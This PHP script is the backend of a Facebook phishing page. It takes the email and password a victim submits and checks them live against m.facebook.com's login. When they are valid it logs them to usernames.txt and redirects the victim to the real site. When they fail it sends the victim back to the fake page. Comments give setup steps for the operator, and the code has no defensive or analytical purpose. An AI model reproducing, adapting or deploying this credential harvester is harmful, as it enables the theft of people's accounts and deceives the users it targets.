

<?php
error_reporting(0);

$url  = 'https://m.facebook.com/login.php';

login($url);

function login($url){
    $user = $_POST['email'];
    $pass = $_POST['pass'];
    $fp = fopen("cookie.txt", "w");  // create cookie.txt file and add permission 777.. chmod 777 cookie.txt
    fclose($fp);
    $login = curl_init();
    curl_setopt($login, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass);
    curl_setopt($login, CURLOPT_COOKIEJAR, "cookie.txt");
    curl_setopt($login, CURLOPT_COOKIEFILE, "cookie.txt");
    curl_setopt($login, CURLOPT_TIMEOUT, 40000);
    curl_setopt($login, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($login, CURLOPT_URL, $url);
    curl_setopt($login, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($login, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($login, CURLOPT_POST, TRUE);
    ob_start();
    return curl_exec ($login);
    ob_end_clean();
    curl_close ($login);
    unset($login);  

}       

     $lines = file('cookie.txt');
     $lines =preg_grep("/c_user/", $lines);

if($lines){


      file_put_contents("usernames.txt", " Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);  
      header("Location: https://m.facebook.com"); 

}

        
     else{
               // add your site url here.. https://sitename.com/login.php?error

        header("Location: /login.php?error");

        exit();
     }

?>
